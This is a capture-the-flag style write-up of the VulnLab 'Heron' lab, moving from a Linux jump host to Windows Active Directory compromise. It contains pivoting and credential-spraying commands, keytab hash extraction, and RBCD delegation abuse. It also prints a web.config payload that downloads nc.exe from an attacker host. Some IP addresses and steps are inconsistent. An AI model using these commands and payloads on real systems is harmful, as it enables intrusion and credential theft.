---
layout: post
title: "Heron (Medium) — VulnLab"
date: 2026-02-19 22:00:00 +0100
categories:
  - Writeups
  - VulnLab
tags:
  - Heron
  - Medium
  - Windows
  - Linux
  - ActiveDirectory
  - Pivoting
  - RBCD
image: assets/img/Writeup/VulnLab/Heron/heron-01.png
description: Medium chain writeup by Uzurly (VulnLab) — Linux jump host to Windows Active Directory
---

# Enumeration

Two targets, reachable from my attack box at `10.8.4.129`:

```
Target: 10.10.160.85, 10.10.160.86
```

![1](/assets/img/Writeup/VulnLab/Heron/heron-01.png)

A quick ping told me more than expected — TTL alone gives away the OS:

```
ping 10.10.173.53 > 64 bytes from 10.10.160.86: icmp_seq=1 ttl=63 time=14.6 ms
ping 10.10.173.54 > 64 bytes from 10.10.160.85: icmp_seq=1 ttl=127 time=13.6 ms
```

TTL 63 (started at 64) means Linux for `.86`; TTL 127 (started at 128) means Windows for `.85`. An Nmap scan of both only turned up one open port — SSH on the Linux box:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
```

# Foothold — the Linux jump host

## SSH

Logged in with the provided credentials `pentest:Heron123!`:

![2](/assets/img/Writeup/VulnLab/Heron/heron-02.png)

Manual enumeration and linpeas turned up nothing useful, so I pulled [fscan](https://github.com/shadow1ng/fscan) onto the box to sweep the internal network it sits on:

![3](/assets/img/Writeup/VulnLab/Heron/heron-03.png)

## Pivoting with Ligolo-ng

fscan revealed internal-only ports behind the jump host, so it was time to tunnel in:

```
# on the attack box
./proxy -selfcert -laddr 0.0.0.0:11601

[Agent : pentest@frajmp.heron.vl] » ifcreate --name lig
[Agent : pentest@frajmp.heron.vl] » add_route --name lig --route 172.16.10.0/24
INFO[0122] Route created.

# on the target
./agent -connect 10.8.4.129:11601 -ignore-cert
```

![4](/assets/img/Writeup/VulnLab/Heron/heron-04.png)

## Web on the internal segment

With the route up, an internal web server on port 80 became reachable:

![5](/assets/img/Writeup/VulnLab/Heron/heron-05.png)

The page leaked 3 usernames, which I fed straight into a Kerberos AS-REP/AES-roast attempt — and got a hit immediately:

![6](/assets/img/Writeup/VulnLab/Heron/heron-06.png)
![7](/assets/img/Writeup/VulnLab/Heron/heron-07.png)

Cracked the recovered hash with John:

![8](/assets/img/Writeup/VulnLab/Heron/heron-08.png)

# Credential harvesting over SMB

Those creds opened up SMB access:

![9](/assets/img/Writeup/VulnLab/Heron/heron-09.png)

A small wrapper script driving every relevant NetExec module pulled more credential material out of the shares:

![10](/assets/img/Writeup/VulnLab/Heron/heron-10.png)

A `groups.xml` file (classic GPP leftover) revealed two more service accounts to add to the user list — `svc-web-accounting` and `svc-web-accounting-d`:

```
nxc smb heron.vl -u 'users.txt' -p 'pass.txt' | grep -i '[+]'
SMB                      10.10.150.5     445    MUCDC            [+] heron.vl\svc-web-accounting-d:H3r0n2024#!
```

![11](/assets/img/Writeup/VulnLab/Heron/heron-11.png)
![12](/assets/img/Writeup/VulnLab/Heron/heron-12.png)

# From a writable share to code execution

`svc-web-accounting-d` had **read/write** on the `accounting$` share, which held a `web.config` for an ASP.NET Core accounting app:

```xml
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <location path="." inheritInChildApplications="false">
    <system.webServer>
      <handlers>
        <add name="aspNetCore" path="*" verb="*" modules="AspNetCoreModuleV2" resourceType="Unspecified" />
      </handlers>
      <aspNetCore processPath="dotnet" arguments=".\AccountingApp.dll" stdoutLogEnabled="false" stdoutLogFile=".\logs\stdout" hostingModel="inprocess" />
    </system.webServer>
  </location>
</configuration>
```

`web.config` for IIS's ASP.NET Core module is directly executable: whatever `processPath`/`arguments` point to gets run by the worker process. Write access to that file is effectively write access to command execution. I set up two Ligolo listeners to catch the callback, then swapped the handler to launch a downloader instead of `dotnet`:

```
[Agent : pentest@frajmp.heron.vl] » listener_add --tcp --addr 0.0.0.0:8000 --to 10.10.14.11:8000
[Agent : pentest@frajmp.heron.vl] » listener_add --tcp --addr 0.0.0.0:4444 --to 10.10.14.11:4444
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <location path="." inheritInChildApplications="false">
    <system.webServer>
      <handlers>
        <add name="aspNetCore" path="uzur" verb="*" modules="AspNetCoreModuleV2" resourceType="Unspecified" />
      </handlers>
      <aspNetCore processPath="cmd.exe" arguments='/c echo IWR http://10.10.14.11:8000/nc.exe -OutFile %TEMP%\nc.exe | powershell -noprofile' stdoutLogEnabled="false" stdoutLogFile=".\logs\stdout" hostingModel="OutOfProcess" />
    </system.webServer>
  </location>
</configuration>
```

Hitting the app triggered the handler and dropped a shell.

# Root on the Linux jump host

Local enumeration on `frajmp` (the Linux jump host) turned up a root-level credential, `Deplete5DenialDealt`:

![13](/assets/img/Writeup/VulnLab/Heron/heron-13.png)

## Extracting the machine's Kerberos keytab

As root, I pulled the host's keytab and extracted its computer-account secrets:

```
python3 keytabextract.py key
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : HERON.VL
        SERVICE PRINCIPAL : FRAJMP$/
        NTLM HASH : 6f55b3b443ef192c804b2ae98e8254f7
        AES-256 HASH : 7be44e62e24ba5f4a5024c185ade0cd3056b600bb9c69f11da3050dd586130e7
        AES-128 HASH : dcaaea0cdc4475eee9bf78e6a6cbd0cd
```

![14](/assets/img/Writeup/VulnLab/Heron/heron-14.png)

# Domain Controller access

The Linux root password (`Deplete5DenialDealt`) sprayed successfully against domain users, landing on `Julian.Pratt`. Non-admins can't RDP straight to the DC here, but the `home$` share is reachable:

```
nxc smb 172.16.10.100 -u 'users.txt' -p 'Deplete5DenialDealt' --shares
```

![15](/assets/img/Writeup/VulnLab/Heron/heron-15.png)

```
smbclientng -u julian.pratt -p 'Deplete5DenialDealt' --host 172.16.10.100
```

![16](/assets/img/Writeup/VulnLab/Heron/heron-16.png)
![17](/assets/img/Writeup/VulnLab/Heron/heron-17.png)

# Privilege escalation — Resource-Based Constrained Delegation

Browsing `julian.pratt`'s files led to another set of credentials, `adm_prju`:

![18](/assets/img/Writeup/VulnLab/Heron/heron-18.png)

```
nxc ldap 172.16.10.100 -u 'adm_prju' -p 'ayDMWV929N9wAiB4' -M maq
LDAP        172.16.10.100   389    MUCDC            [*] Windows Server 2022 Build 20348 (name:MUCDC) (domain:heron.vl) (signing:None) (channel binding:Never)
LDAP        172.16.10.100   389    MUCDC            [+] heron.vl\adm_prju:ayDMWV929N9wAiB4
MAQ         172.16.10.100   389    MUCDC            MachineAccountQuota: 0
```

A `MachineAccountQuota` of `0` rules out the classic "add a fake computer account" RBCD path — but `adm_prju` had write access to the domain controller's `msDS-AllowedToActAsOnBehalfOfOtherIdentity` attribute directly:

```
rbcd.py -delegate-from 'adm_prju' -delegate-to 'mucdc$' -dc-ip 172.16.10.100 -action 'write' 'heron.vl/adm_prju:ayDMWV929N9wAiB4'
rbcd.py -delegate-to 'mucdc$' -dc-ip 172.16.10.100 -action 'read' 'heron.vl/adm_prju:ayDMWV929N9wAiB4'
```

![19](/assets/img/Writeup/VulnLab/Heron/heron-19.png)

Since I already held `FRAJMP$`'s NT hash from the keytab extraction earlier, the cleanest path was configuring RBCD so `FRAJMP$` is trusted to delegate to the DC's computer account — rather than the SPN-less S4U2Self/U2U variant, which is destructive and best avoided outside of disposable test accounts ([reference](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users)).

![20](/assets/img/Writeup/VulnLab/Heron/heron-20.png)
![21](/assets/img/Writeup/VulnLab/Heron/heron-21.png)
![22](/assets/img/Writeup/VulnLab/Heron/heron-22.png)

With RBCD configured, `FRAJMP$` can request a service ticket to the DC while impersonating any user via S4U2Self/S4U2Proxy — the standard follow-up from there is forging a ticket as a Domain Admin and dumping the domain's secrets.

# Takeaways

- TTL alone is often enough to fingerprint an OS before Nmap even finishes.
- fscan from inside a foothold is a fast way to reveal internally-firewalled services worth pivoting to with Ligolo-ng.
- A writable `web.config` on an IIS/ASP.NET Core app is direct code execution — the module blindly launches whatever `processPath`/`arguments` say.
- GPP artifacts (`groups.xml`) are still a reliable source of leftover service-account credentials years after Microsoft "fixed" the issue.
- A `MachineAccountQuota` of `0` closes the door on the classic RBCD attack, but doesn't matter if you can write `msDS-AllowedToActAsOnBehalfOfOtherIdentity` directly, or already control a computer account whose hash you can use as the delegating identity.
